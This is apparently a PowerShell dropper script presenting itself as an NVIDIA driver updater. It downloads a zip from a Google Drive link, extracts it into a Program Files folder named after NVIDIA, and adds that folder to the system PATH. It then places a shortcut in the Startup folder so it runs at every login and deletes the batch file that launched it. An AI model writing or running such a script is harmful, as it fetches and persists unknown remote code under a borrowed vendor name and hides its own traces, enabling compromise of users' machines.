$username=[Environment]::UserName
$zipFile = "https://drive.usercontent.google.com/download?id=1XmS9uj5fCirYFuTAi_pGBG0UhvmgLcqH&export=download&authuser=0&confirm=t&uuid=502ce247-bd39-44a2-a80d-58f9effe1024&at=APZUnTX1xE6NM8qFUI544y4SmIpG:1722343650471"
$op = "C:\Users\$username\AppData\Local\Temp\updater.zip"
$cmd1 = "curl `"$zipFile`" --output `"$op`""
cmd /c $cmd1
Expand-Archive "C:\Users\$username\AppData\Local\Temp\updater.zip" -DestinationPath "C:\Program Files\NVIDIA Graphics Drivers"
$Path = [Environment]::GetEnvironmentVariable("PATH", "Machine")+';C:\Program Files\NVIDIA Graphics Drivers\bin;C:\Program Files\NVIDIA Graphics Drivers\include'
[Environment]::SetEnvironmentVariable( "Path", $Path, "Machine" )
cp "C:\Program Files\NVIDIA Graphics Drivers\Nvidia Driver.lnk" "C:\Users\$username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
del C:\Users\$username\Downloads\first.bat
